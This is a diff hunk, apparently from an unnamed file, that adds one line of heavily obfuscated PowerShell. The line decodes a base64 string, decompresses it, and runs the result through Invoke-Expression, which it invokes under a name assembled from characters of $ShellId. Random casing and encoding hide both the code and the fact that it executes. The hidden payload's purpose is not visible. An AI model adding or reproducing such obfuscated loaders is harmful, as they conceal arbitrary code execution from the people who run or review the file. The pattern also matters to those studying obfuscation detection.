@@ -1,0 +1,1 @@
+(nEW-oBjeCt  IO.CoMPReSSIoN.DeflATESTReam([SYstEm.Io.mEMORYsTrEaM] [cONverT]::fRoMbaSE64StRiNG('Cy/KLEnV9cgvLlHwSM3JyVcIzy/KSVFU0E1TKEpN4QIA' ) , [SysteM.Io.COmPReSSIon.COMPreSSiOnMODe]::decoMpRESs )|FOrEAch-OBject{ nEW-oBjeCt sYSTEM.io.sTreAMREaDER($_ , [texT.EnCodInG]::AscII) } ).REadtoeNd( ) |&( $sheLLId[1]+$sHElLiD[13]+'x')
